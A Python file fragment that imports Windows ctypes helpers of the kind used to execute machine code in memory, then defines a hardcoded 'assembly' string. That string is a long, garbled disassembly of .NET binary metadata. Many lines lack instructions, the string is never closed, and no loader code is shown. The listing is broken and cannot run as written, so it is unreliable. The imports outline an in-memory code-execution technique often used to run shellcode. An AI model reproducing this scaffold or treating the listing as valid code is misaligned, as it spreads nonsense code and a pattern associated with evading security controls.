import re
import argparse
from ctypes import windll, c_char_p, c_void_p, cast, CFUNCTYPE, byref, c_uint32

# Hardcoded assembly
ASSEMBLY_CODE = """
ja     0x402032
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
eax
BYTE PTR [eax],al
BYTE PTR [edx],al
BYTE PTR ds:0x232000,al
BYTE PTR [esp+ecx*1],bh
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
eax,DWORD PTR [eax]
BYTE PTR [esi],al
esi,DWORD PTR [eax]
al,BYTE PTR [eax]
cmp    BYTE PTR [eax],al
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [ecx],dl
jae    0x402062
BYTE PTR [eax],al
push   es
or     al,BYTE PTR [esi]
sub    BYTE PTR ds:0x7d0a0000,dl
al,BYTE PTR [eax]
BYTE PTR [esi+eax*1],al
bh,BYTE PTR [ebp+0x3]
BYTE PTR [eax],al
al,0x6
eax,0x17d
al,0x6
jl     0x402080
BYTE PTR [eax],al
al,0x12
BYTE PTR [eax],ch
DWORD PTR [eax],eax
BYTE PTR [ebx],ch
push   es
jl     0x40208d
BYTE PTR [eax],al
al,0x28
pop    ss
BYTE PTR [eax],al
or     ch,BYTE PTR [edx]
and    al,BYTE PTR [edx]
sub    BYTE PTR [eax],bl
BYTE PTR [eax],al
or     al,BYTE PTR [eax]
sub    al,BYTE PTR [eax]
BYTE PTR [eax],al
esi,DWORD PTR [eax]
DWORD PTR [eax],eax
al,0x0
BYTE PTR [eax],al
al,BYTE PTR [eax]
BYTE PTR [ecx],dl
ch,BYTE PTR [eax]
DWORD PTR [eax],eax
BYTE PTR [esi],al
outs   dx,DWORD PTR ds:[esi]
sbb    DWORD PTR [eax],eax
BYTE PTR [edx],cl
or     dl,BYTE PTR [edx]
BYTE PTR [eax],ch
sbb    al,BYTE PTR [eax]
BYTE PTR [edx],cl
sub    ah,BYTE PTR [edx]
ch,BYTE PTR [eax]
sbb    BYTE PTR [eax],al
BYTE PTR [edx],cl
BYTE PTR [edx],ch
BYTE PTR [eax],al
BYTE PTR [ebx],bl
xor    BYTE PTR [ebx],al
bh,bl
DWORD PTR [eax],eax
BYTE PTR [ebx],al
BYTE PTR [eax],al
DWORD PTR [edx],eax
jnp    0x4020dc
BYTE PTR [eax],al
al,0xa
push   es
sub    al,0x2
sub    eax,DWORD PTR [edx]
sub    edx,DWORD PTR [edi]
BYTE PTR [edx],al
jb     0x4020eb
BYTE PTR [eax],al
jo     0x40216b
al,0x0
BYTE PTR [edx+eax*1],al
jae    0x402110
BYTE PTR [eax],al
or     bh,BYTE PTR [ebp+0x5]
BYTE PTR [eax],al
al,0x0
push   es
sub    al,0x2
sub    eax,DWORD PTR [edx]
sub    ecx,DWORD PTR [eax+0x0]
bh,BYTE PTR [ebx+0x5]
BYTE PTR [eax],al
al,0x2
jnp    0x402113
BYTE PTR [eax],al
al,0x6f
sbb    al,0x0
BYTE PTR [edx],cl
outs   dx,DWORD PTR ds:[esi]
sbb    eax,0xb0a0000
al,BYTE PTR [ecx]
sub    BYTE PTR [esi],bl
BYTE PTR [eax],al
or     ch,BYTE PTR ds:0x25160243
or     bh,BYTE PTR [ebp+0x1]
BYTE PTR [eax],al
al,0x2
pop    es
jge    0x40213f
BYTE PTR [eax],al
al,0x2
or     al,0x2
jl     0x40213d
BYTE PTR [eax],al
al,0x12
DWORD PTR [edx],edx
ch,BYTE PTR [eax]
al,BYTE PTR [eax]
BYTE PTR [ebx],ch
ch,bl
imul   eax,DWORD PTR [ecx],0x7b020000
or     al,0x0
BYTE PTR [ebx+ecx*1],al
bh,BYTE PTR [esp+ecx*1+0x0]
BYTE PTR [esi+edi*8],al
eax,0x1b000002
dl,BYTE PTR ds:0x17d0a25
BYTE PTR [eax],al
al,0x2
al,BYTE PTR [ecx]
sub    BYTE PTR [eax],ah
BYTE PTR [eax],al
or     bh,BYTE PTR [ebp+0x7]
BYTE PTR [eax],al
al,0x2
bh,BYTE PTR [ebx+0x7]
BYTE PTR [eax],al
al,0x7d
push   es
BYTE PTR [eax],al
al,0x2
al,0x7d
pop    es
BYTE PTR [eax],al
al,0x2
sub    BYTE PTR [ecx],ah
BYTE PTR [eax],al
or     bh,BYTE PTR [ebp+0x8]
BYTE PTR [eax],al
al,0x0
bh,BYTE PTR [ebx+0x8]
BYTE PTR [eax],al
al,0x2
jnp    0x4021a4
BYTE PTR [eax],al
al,0x6f
and    al,BYTE PTR [eax]
BYTE PTR [edx],cl
al,BYTE PTR es:[edx]
jnp    0x4021b3
BYTE PTR [eax],al
al,0x6f
and    eax,DWORD PTR [eax]
BYTE PTR [edx],cl
jge    0x4021be
BYTE PTR [eax],al
al,0x0
al,BYTE PTR [edx]
jnp    0x4021c6
BYTE PTR [eax],al
al,0x6f
and    al,0x0
BYTE PTR [edx],cl
jge    0x4021d1
BYTE PTR [eax],al
al,0x2b
sub    eax,DWORD PTR [edx]
bh,BYTE PTR [ebx+0xa]
BYTE PTR [eax],al
al,0x6f
and    eax,0x7d0a0000
or     eax,DWORD PTR [eax]
BYTE PTR [eax+eax*1],al
bh,BYTE PTR [ebx+0xb]
BYTE PTR [eax],al
al,0x6f
BYTE PTR es:[eax],al
or     ch,BYTE PTR [eax]
BYTE PTR [eax],al
or     al,BYTE PTR [eax]
BYTE PTR [edx],al
al,0x7d
or     eax,DWORD PTR [eax]
BYTE PTR [edx+eax*1],al
jnp    0x402204
BYTE PTR [eax],al
al,0x6f
sub    BYTE PTR [eax],al
BYTE PTR [edx],cl
sub    eax,0x619dec8
push   ss
das
al,0x2
jnp    0x402217
BYTE PTR [eax],al
al,0x2c
or     al,0x2
jnp    0x40221f
BYTE PTR [eax],al
al,0x6f
sub    DWORD PTR [eax],eax
BYTE PTR [edx],cl
ah,bl
dl,BYTE PTR [edi*2+0x400000a]
BYTE PTR [edx],al
al,0x7d
or     DWORD PTR [eax],eax
BYTE PTR [esi+ebx*8],al
sbb    DWORD PTR [esi],eax
push   ss
das
al,0x2
jnp    0x40223f
BYTE PTR [eax],al
al,0x2c
or     al,0x2
jnp    0x402247
BYTE PTR [eax],al
al,0x6f
sub    DWORD PTR [eax],eax
BYTE PTR [edx],cl
ah,bl
dl,BYTE PTR [edi*2+0x4000008]
BYTE PTR [edx],al
al,0x7d
push   es
BYTE PTR [eax],al
al,0xde
sbb    DWORD PTR [esi],eax
push   ss
das
al,0x2
jnp    0x402266
BYTE PTR [eax],al
al,0x2c
or     al,0x2
jnp    0x40226e
BYTE PTR [eax],al
al,0x6f
sub    DWORD PTR [eax],eax
BYTE PTR [edx],cl
ah,bl
dl,BYTE PTR [edi*2+0x4000005]
ficomp WORD PTR [edi]
or     eax,0x7dfe1f02
DWORD PTR [eax],eax
BYTE PTR [edx+eax*1],al
al,0x7d
al,0x0
BYTE PTR [edx+eax*1],al
jl     0x402291
BYTE PTR [eax],al
al,0x9
sub    BYTE PTR [edx],ch
BYTE PTR [eax],al
or     al,BYTE PTR [eax]
ficomp WORD PTR [ebx]
bl,BYTE PTR [edi]
(bad)
jge    0x4022a1
BYTE PTR [eax],al
al,0x2
al,0x7d
al,0x0
BYTE PTR [edx+eax*1],al
jl     0x4022af
BYTE PTR [eax],al
al,0x28
sub    eax,DWORD PTR [eax]
BYTE PTR [edx],cl
BYTE PTR [edx],ch
BYTE PTR [ecx+0x64],al
BYTE PTR [eax],al
al,BYTE PTR [eax]
BYTE PTR [eax],al
repnz add BYTE PTR [eax],al
BYTE PTR [eax+eax*1],bh
BYTE PTR [eax],al
DWORD PTR cs:[eax],eax
BYTE PTR [ecx],bl
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [edx],al
BYTE PTR [eax],al
BYTE PTR [eax+eax*1+0x9c0000],bh
BYTE PTR [eax],al
pop    eax
DWORD PTR [eax],eax
BYTE PTR [ecx],bl
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [edx],al
BYTE PTR [eax],al
BYTE PTR [esi],ah
BYTE PTR [eax],al
BYTE PTR [ecx+eax*1+0x0],bl
BYTE PTR [edx+0x19000001],al
BYTE PTR [eax],al
BYTE PTR [edi],al
BYTE PTR [eax],al
BYTE PTR [ebp-0x5bffffff],bl
DWORD PTR [eax],eax
BYTE PTR [edi],bl
BYTE PTR [eax],al
BYTE PTR [eax],bl
BYTE PTR [eax],al
DWORD PTR [esi],eax
sub    al,BYTE PTR [eax]
BYTE PTR [edx+0x53],al
edx
inc    edx
DWORD PTR [eax],eax
DWORD PTR [eax],eax
BYTE PTR [eax],al
BYTE PTR [eax],al
or     al,0x0
BYTE PTR [eax],al
jbe    0x402366
xor    BYTE PTR cs:[esi],ch
xor    esi,DWORD PTR [eax]
xor    esi,DWORD PTR [ecx]
cmp    DWORD PTR [eax],eax
BYTE PTR [eax],al
BYTE PTR ds:0x6c00,al
BYTE PTR [eax],ah
al,0x0
BYTE PTR [ebx],ah
jle    0x40234b
BYTE PTR [esp+eax*1+0x5480000],cl
BYTE PTR [eax],al
and    edx,DWORD PTR [ebx+0x74]
jb     0x4023c2
outs   dx,BYTE PTR ds:[esi]
addr16 jae 0x40235d
BYTE PTR [eax],al
ah,dl
or     DWORD PTR [eax],eax
BYTE PTR [eax+0x0],dl
BYTE PTR [eax],al
and    edx,DWORD PTR [ebp+0x53]
BYTE PTR [edx+ecx*1],ah
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
and    eax,DWORD PTR [edi+0x55]
ecx
inc    esp
BYTE PTR [eax],al
BYTE PTR [edx+ecx*1],dh
BYTE PTR [eax],al
or     BYTE PTR [edx],al
BYTE PTR [eax],al
and    eax,DWORD PTR [edx+0x6c]
outs   dx,DWORD PTR ds:[esi]
bound  eax,QWORD PTR [eax]
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [eax],al
al,BYTE PTR [eax]
BYTE PTR [ecx],al
push   edi
pop    ss
cl,BYTE PTR [edx]
or     DWORD PTR [edx],ecx
BYTE PTR [eax],al
dl,bh
DWORD PTR [ebx],esi
BYTE PTR [esi],dl
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
and    eax,DWORD PTR [eax]
BYTE PTR [eax],al
eax,DWORD PTR [eax]
BYTE PTR [eax],al
or     al,0x0
BYTE PTR [eax],al
push   es
BYTE PTR [eax],al
BYTE PTR [ebx],al
BYTE PTR [eax],al
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [ebx],ch
BYTE PTR [eax],al
BYTE PTR ds:0x3000000,dl
BYTE PTR [eax],al
BYTE PTR [edx],al
BYTE PTR [eax],al
BYTE PTR [eax+eax*1],al
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
al,0x0
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
al,BYTE PTR [eax]
BYTE PTR [eax],al
BYTE PTR [eax],al
fwait
eax,DWORD PTR [ecx]
BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [esi],al
bh,al
bl,BYTE PTR [esp+eax*1+0x3320006]
pushf
al,0x6
BYTE PTR [edi+0xf048901],ah
BYTE PTR [esp+eax*1+0x60000],bh
sbb    al,0x2
push   eax
eax,DWORD PTR [esi]
BYTE PTR [ecx],bl
ebp,ebp
eax,DWORD PTR [esi]
BYTE PTR [eax+0x603ed02],dl
BYTE PTR [ebp+0x2],cl
in     eax,dx
eax,DWORD PTR [esi]
BYTE PTR [edx+0x2],ch
in     eax,dx
eax,DWORD PTR [esi]
bh,ah
ch,ch
eax,DWORD PTR [esi]
ch,cl
ebp,ebp
eax,DWORD PTR [esi]
BYTE PTR [edi+0x6049c02],ch
ah,bh
al,0xc4
eax,DWORD PTR [esi]
BYTE PTR [eax],al
ebx,DWORD PTR [esp+eax*1+0x16d0006]
les    eax,FWORD PTR [ebx]
push   es
ah,ah
DWORD PTR [esp+eax*1+0x1ff0006],ebx
mov    DWORD PTR [esi+eax*1],eax
BYTE PTR [edi+0x3],dh
rol    BYTE PTR [esi+eax*1],1
BYTE PTR [ebx+0x6049c01],bh
BYTE PTR [edx+0x4],dl
pushf
al,0x6
BYTE PTR [ecx+eax*1+0x6049c],cl
cmp    eax,0x6049c01
BYTE PTR [edi],dh
BYTE PTR [esp+eax*1+0x4020006],bl
les    eax,FWORD PTR [ebx]
push   es
BYTE PTR [esp+eax*1],bl
pushf
al,0xa
BYTE PTR [edi],dl
eax,0xe040c
mov    cl,0x3
rol    BYTE PTR [ebx],1
push   es
BYTE PTR [edx],ch
BYTE PTR [ebx+eax*1+0xe],bh
dl,bh
al,0xd0
eax,DWORD PTR [esi]
BYTE PTR [ebp+0x0],al
mov    cl,0x0
push   es
BYTE PTR ds:0x6048902,dh
BYTE PTR [ebx],ah
al,dl
al,0x12
BYTE PTR [ecx+eax*1],bl
les    eax,FWORD PTR [ebx]
push   es
BYTE PTR [ecx+0x4],ch
out    0x4,eax
push   es
BYTE PTR [ecx],cl
esp,eax
eax,DWORD PTR [eax]
BYTE PTR [eax],al
BYTE PTR [ecx+0x0],ah
BYTE PTR [ecx],al
BYTE PTR [ecx],al
BYTE PTR [eax],al
BYTE PTR [eax],dl
BYTE PTR [ebx+eax*1+0x350000],bh
DWORD PTR [eax],eax
DWORD PTR [eax],eax
eax,DWORD PTR [ecx]
BYTE PTR [eax],al
DWORD PTR [eax],eax
BYTE PTR [eax],al
xor    eax,0x4000100
BYTE PTR [esi],al
BYTE PTR [ecx+0x600e901],al
BYTE PTR [ebx],dh
al,0xec
BYTE PTR [esi],al
bl,cl
al,0xf0
BYTE PTR [ecx],al
BYTE PTR [eax+eax*1],cl
hlt
BYTE PTR [ecx],al
BYTE PTR [ebx+0x0],dl
test   DWORD PTR [eax],0x600001
hlt
BYTE PTR [ecx],al
BYTE PTR [edi+0x0],ch
hlt
BYTE PTR [ecx],al
BYTE PTR [esi+0x0],dh
sti
BYTE PTR [ecx],al
BYTE PTR [edi+0x0],bh
inc    DWORD PTR [eax]
DWORD PTR [eax],eax
lea    eax,[eax]
pop    es
DWORD PTR [ecx],eax
BYTE PTR [eax+eax*1+0x1010f],dl
sbb    al,0x0
eax,DWORD PTR [ecx]
push   eax
and    BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [ecx+0x1a03cb00],dl
DWORD PTR [ecx],eax
BYTE PTR [eax+eiz*1+0x0],dl
xchg   BYTE PTR [eax],bl
DWORD PTR [esi+eax*1],0x0
al,BYTE PTR [eax]
mov    al,ds:0x20
BYTE PTR [ecx+0x2100aa08],dl
DWORD PTR [edx],eax
al,al
and    BYTE PTR [eax],al
BYTE PTR [eax],al
BYTE PTR [esi+0x6048318],al
BYTE PTR [ebx],al
ah,cl
and    BYTE PTR [eax],al
BYTE PTR [eax],al
cl,ah
DWORD PTR [esi],edi
eax,0x30006
sbb    al,0x23
BYTE PTR [eax],al
BYTE PTR [eax],al
loope  0x402581
push   eax
DWORD PTR [eax],esp
BYTE PTR [ebx],al
BYTE PTR [eax],al
BYTE PTR [ecx],al
bl,cl
al,0x0
BYTE PTR [ecx],al
bl,cl
al,0x0
BYTE PTR [ecx],al
BYTE PTR [eax+0x1],ah
eax,DWORD PTR [eax]
pop    ecx
BYTE PTR [ecx],cl
BYTE PTR [ebx+0x11000104],al
BYTE PTR [ebx+0x19000604],al
BYTE PTR [ebx+0x29000a04],al
BYTE PTR [ebx+0x31001004],al
BYTE PTR [ebx+0x39001004],al
BYTE PTR [ebx+0x41001004],al
BYTE PTR [ebx+0x49001004],al
BYTE PTR [ebx+0x51001004],al
BYTE PTR [ebx+0x59001004],al
BYTE PTR [ebx+0x61001004],al
BYTE PTR [ebx+0x71000104],al
BYTE PTR [ebx-0x7effeafc],al
BYTE PTR [ebx-0x76ffe5fc],al
BYTE PTR [ebx-0x66fff9fc],al
BYTE PTR [ebx-0x56ffeafc],al
BYTE PTR [ebx-0x4efff9fc],al
BYTE PTR [esi],bh
eax,0xb10006
push   eax
DWORD PTR [eax],esp
BYTE PTR [ecx+0x26048300],bl
cl,bh
BYTE PTR [ebx-0x36fff9fc],al
BYTE PTR [edx+0x1],bh
xor    DWORD PTR [eax],eax
leave
BYTE PTR [eax],bh
eax,0xc90036
jae    0x402627
inc    ebx
BYTE PTR [ecx+0x0],ch
DWORD PTR [esi+eax*1],0x0
xchg   ecx,eax
BYTE PTR [esi+0x4],bl
ebp
BYTE PTR [ecx+0x6050300],ah
cl,dl
BYTE PTR [ebx-0x2efff9fc],al
ah,cl
BYTE PTR [edi+0x0],bl
or     al,0x0
pop    esi
al,0x70
BYTE PTR [eax+eax*1],dl
repnz add BYTE PTR [edi+0x0],bh
leave
bl,bl
BYTE PTR [ebx+0x3001400],al
eax,0xd90098
jp     0x402661
popf
cl,bl
BYTE PTR [esi],ch
eax,0xd900a2
al,BYTE PTR [ecx]
test   al,0x0
sbb    al,0x0
jne    0x402676
mov    eax,0x22002400
eax,0x690098
push   0x3
enter  0x900,0x1
xor    eax,DWORD PTR [ecx]
int3
BYTE PTR [ecx],dl
DWORD PTR [esi],edi
eax,0x119007f
jb     0x402691
push   es
cl,cl
bh,bh
edx,ecx
cl,cl
BYTE PTR ds:0x20000605,cl
BYTE PTR [ebx+0x0],ah
rol    BYTE PTR [ecx],1
and    BYTE PTR [eax],al
imul   eax,DWORD PTR [eax],0xffffffd6
DWORD PTR [eax],esp
BYTE PTR [ebx+0x0],dh
out    dx,al
DWORD PTR [edi],esp
BYTE PTR [ebx+0x0],bl
inc    BYTE PTR [ecx]
BYTE PTR cs:[ebx],cl
BYTE PTR [edi],ah
DWORD PTR [esi],ebp
BYTE PTR [ebx],dl
BYTE PTR [eax],dh
DWORD PTR [esi],ebp
BYTE PTR [ebx],bl
BYTE PTR [edi+0x1],cl
BYTE PTR cs:[ebx],ah
BYTE PTR [eax+0x1],bl
BYTE PTR cs:[ebx],ch
BYTE PTR [esi+0x33002e01],dl
BYTE PTR [ebp+0x3b002e01],ch
BYTE PTR [eax+0x43002e01],bh
ch,al
DWORD PTR [esi],ebp
BYTE PTR [ebx+0x0],cl
xchg   esi,eax
DWORD PTR [esi],ebp
BYTE PTR [ebx+0x0],dl
xchg   esi,eax
DWORD PTR [eax+eax*1+0x7b],eax
al,dl
DWORD PTR [eax+0x0],esp
jae    0x4026fc
out    dx,al
DWORD PTR [ecx+0x0],esp
fwait
bl,dh
DWORD PTR [ebx+0x0],esp
DWORD PTR [eax],0xffffffee
DWORD PTR [eax+eax*1+0x7b],esp
al,dl
eax,eax
BYTE PTR [ebx-0x7efe1200],ah
DWORD PTR [ebx+0x2c01f300],ebx
BYTE PTR [eax+0x0],cl
push   edx
BYTE PTR [ebx],al
BYTE PTR [edx],cl
BYTE PTR [ebx],ah
BYTE PTR [ebx],al
BYTE PTR [eax+eax*1],cl
and    eax,0x79006900
BYTE PTR [ecx+0x400c100],dh
BYTE PTR [eax],0x0
DWORD PTR [eax],eax
inc    eax
al,0x0
BYTE PTR [ecx],cl
BYTE PTR [eax],al
bh,dl
BYTE PTR [ecx+eax*1],ah
BYTE PTR [eax],al
BYTE PTR [eax],al
or     DWORD PTR [eax],eax
BYTE PTR [eax],al
xlat   BYTE PTR ds:[ebx]
BYTE PTR [esp+eax*1],cl
BYTE PTR [eax],al
BYTE PTR [eax],al
pop    es
BYTE PTR ds:0xf4000000,al
DWORD PTR [eax],eax
BYTE PTR [eax],al
al,ah
al,dl
eax,DWORD PTR [eax]
BYTE PTR [eax],al
BYTE PTR [ecx],cl
BYTE PTR [eax],al
bh,dl
BYTE PTR ds:0x1,dl
BYTE PTR [ebx],al
BYTE PTR [edx],al
BYTE PTR ds:0x3f003e00,ch
BYTE PTR [esi+0x0],cl
BYTE PTR [eax],al
cmp    al,0x4d
popa
imul   ebp,DWORD PTR [esi+0x3e],0x305f5f64
BYTE PTR [ebx+esi*2],bh
arpl   WORD PTR [edx+0x69],si
jo     0x402833
push   ebp
jb     0x40282e
ds xor eax,0x315f5f
cmp    al,0x3e
jne    0x40282b
pop    edi
xor    DWORD PTR [eax],eax
push   esp
popa
jae    0x40283e
pusha
xor    DWORD PTR [eax],eax
inc    ebx
outs   dx,DWORD PTR ds:[esi]
ins    BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
outs   dx,BYTE PTR ds:[esi]
pusha
xor    DWORD PTR [eax],eax
push   esp
popa
jae    0x402852
inc    ecx
ja     0x40284b
imul   esi,DWORD PTR [ebp+eiz*2+0x72],0x49003160
inc    ebp
outs   dx,BYTE PTR ds:[esi]
jne    0x402863
gs jb  0x40285a
je     0x40286a
jb     0x40285d
xor    DWORD PTR [eax],eax
cmp    al,0x63
ins    BYTE PTR es:[edi],dx
imul   esp,DWORD PTR [ebp+0x6e],0x5f353e74
pop    edi
xor    al,BYTE PTR [eax]
cmp    al,0x70
jae    0x402863
arpl   WORD PTR [edx+0x69],si
jo     0x402889
ds xor eax,0x335f5f
cmp    al,0x3e
jae    0x40287e
pop    edi
xor    al,0x0
cmp    al,0x70
jae    0x402864
xor    eax,0x355f5f
cmp    al,0x72
gs jae 0x4028a5
ins    BYTE PTR es:[edi],dx
je     0x4028a6
ds xor eax,0x365f5f
cmp    al,0x3e
jae    0x40289c
pop    edi
BYTE PTR [edx+esi*2],bh
gs jae 0x4028ba
ins    BYTE PTR es:[edi],dx
je     0x402886
xor    eax,0x385f5f
cmp    al,0x4d
outs   dx,DWORD PTR ds:[esi]
fs jne 0x4028bf
gs add BYTE PTR ds:[ecx*2+0x3e6e6961],bh
BYTE PTR [ebx+0x79],dl
jae    0x4028d5
gs ins DWORD PTR es:[edi],dx
cs inc ebx
outs   dx,DWORD PTR ds:[esi]
ins    BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
outs   dx,BYTE PTR ds:[esi]
jae    0x40289e
inc    edi
outs   dx,BYTE PTR gs:[esi]
gs jb  0x4028df
arpl   WORD PTR [eax],ax
inc    edi
gs je  0x4028cf
je     0x4028f0
imul   ebp,DWORD PTR [esi+0x67],0x6e797341
arpl   WORD PTR [eax],ax
inc    ecx
ja     0x4028eb
imul   esi,DWORD PTR [ebp+edx*2+0x6e],0x65666173
edi
outs   dx,BYTE PTR ds:[esi]
inc    ebx
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
jo     0x402905
gs je  0x402901
BYTE PTR fs:[edi+0x65],ah
je     0x402901
ecx
jae    0x4028e8
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
jo     0x402915
gs je  0x402911
BYTE PTR fs:[ecx+0x6e],cl
jbe    0x402921
imul   esp,DWORD PTR [ebp+0x0],0x49
inc    esp
imul   esi,DWORD PTR [ebx+0x70],0x6261736f
ins    BYTE PTR es:[edi],dx
BYTE PTR gs:[ebx+0x79],dl
jae    0x402939
gs ins DWORD PTR es:[edi],dx
cs inc ebx
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
jae    0x40293c
ins    BYTE PTR es:[edi],dx
BYTE PTR gs:[ebx+0x79],dl
jae    0x402948
gs ins DWORD PTR es:[edi],dx
cs push edx
jne    0x402948
je     0x402945
ins    DWORD PTR es:[edi],dx
BYTE PTR gs:[edi+0x72],dl
imul   esi,DWORD PTR [ebp+eiz*2+0x4c],0x656e69
ecx
inc    ecx
jae    0x402966
outs   dx,BYTE PTR ds:[esi]
arpl   WORD PTR [ebx+0x74],dx
popa
je     0x402959
ebp
popa
arpl   WORD PTR [eax+0x69],bp
outs   dx,BYTE PTR ds:[esi]
BYTE PTR gs:[ebx+0x65],dl
je     0x402953
je     0x402963
je     0x402969
ebp
popa
arpl   WORD PTR [eax+0x69],bp
outs   dx,BYTE PTR ds:[esi]
BYTE PTR gs:[ebx+0x74],dh
popa
je     0x402976
ebp
popa
arpl   WORD PTR [eax+0x69],bp
outs   dx,BYTE PTR ds:[esi]
BYTE PTR gs:[ecx+edi*2+0x70],dl
BYTE PTR gs:[ecx+ebp*2+0x73],al
jo     0x402992
jae    0x40298a
BYTE PTR [ebx+0x72],al
gs popa
je     0x402991
BYTE PTR [esi+edi*1],bh
xor    DWORD PTR [edi+0x5f],ebx
jae    0x4029a8
popa
je     0x40299c
BYTE PTR [ebx+0x6f],al
ins    DWORD PTR es:[edi],dx
jo     0x4029a6
ins    BYTE PTR es:[edi],dx
gs jb  0x402988
outs   dx,BYTE PTR gs:[esi]
gs jb  0x4029a7
je     0x4029ad
fs inc ecx
je     0x4029c0
jb     0x4029b7
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ebp+eiz*2+0x62],al
jne    0x4029bf
addr16 popa
bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
je     0x4029d4
jb     0x4029cb
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[esi+0x75],cl
ins    BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
popa
bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
je     0x4029e6
jb     0x4029dd
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ecx+0x73],al
jae    0x4029e2
ins    DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x54]
imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
imul   esp,DWORD PTR [edx+0x75],0x41006574
jae    0x402a0c
outs   dx,BYTE PTR ds:[esi]
arpl   WORD PTR [ebx+0x74],dx
popa
je     0x4029ff
ebp
popa
arpl   WORD PTR [eax+0x69],bp
outs   dx,BYTE PTR ds:[esi]
gs inc ecx
je     0x402a18
jb     0x402a0f
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ebp+eiz*2+0x62],al
jne    0x402a17
addr16 gs jb 0x402a07
je     0x402a1b
jo     0x402a0c
push   0x67756f72
push   0x72747441
imul   esp,DWORD PTR [edx+0x75],0x54006574
popa
jb     0x402a33
gs je  0x402a15
jb     0x402a32
ins    DWORD PTR es:[edi],dx
gs ja  0x402a44
jb     0x402a42
inc    ecx
je     0x402a4e
jb     0x402a45
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ebp+eiz*2+0x62],al
jne    0x402a4d
addr16 gs jb 0x402a32
imul   esp,DWORD PTR [esp+eiz*2+0x65],0x7474416e
jb     0x402a5d
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ecx+0x73],al
jae    0x402a62
ins    DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x46]
imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
inc    ecx
je     0x402a83
jb     0x402a7a
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ecx+0x73],al
jae    0x402a7f
ins    DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x49]
outs   dx,BYTE PTR ds:[esi]
outs   dx,WORD PTR ds:[esi]
jb     0x402a91
popa
je     0x402a90
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
popa
ins    BYTE PTR es:[edi],dx
push   esi
gs jb  0x402aa2
imul   ebp,DWORD PTR [edi+0x6e],0x72747441
imul   esp,DWORD PTR [edx+0x75],0x41006574
jae    0x402ab2
gs ins DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x43]
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
imul   sp,WORD PTR [edi+0x75],0x6172
je     0x402ab8
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
inc    ecx
je     0x402ac8
jb     0x402abf
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[edx+0x65],dl
push   bx
popa
data16 gs je 0x402add
push   edx
jne    0x402ad3
gs jae 0x402aab
je     0x402ae0
jb     0x402ad7
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ebx+0x6f],al
ins    DWORD PTR es:[edi],dx
jo     0x402ae1
ins    BYTE PTR es:[edi],dx
popa
je     0x402ae5
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
push   edx
gs ins BYTE PTR es:[edi],dx
popa
js     0x402ae5
je     0x402aef
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
jae    0x402acb
je     0x402b00
jb     0x402af7
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ecx+0x73],al
jae    0x402afc
ins    DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x50]
jb     0x402b0d
fs jne 0x402b04
je     0x402ae4
je     0x402b19
jb     0x402b10
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[esi+0x75],cl
ins    BYTE PTR es:[edi],dx
ins    BYTE PTR es:[edi],dx
popa
bound  ebp,QWORD PTR [ebp+eiz*2+0x43]
outs   dx,DWORD PTR ds:[esi]
outs   dx,BYTE PTR ds:[esi]
je     0x402b1e
js     0x402b2f
inc    ecx
je     0x402b32
jb     0x402b29
bound  esi,QWORD PTR [ebp+0x74]
BYTE PTR gs:[ecx+0x73],al
jae    0x402b2e
ins    DWORD PTR es:[edi],dx
bound  ebp,QWORD PTR [ecx+edi*2+0x43]
outs   dx,DWORD PTR ds:[esi]
ins    DWORD PTR es:[edi],dx
jo     0x402b33
outs   dx,BYTE PTR ds:[esi]
jns    0x402b16
je     0x402b4b
jb     0x402b42
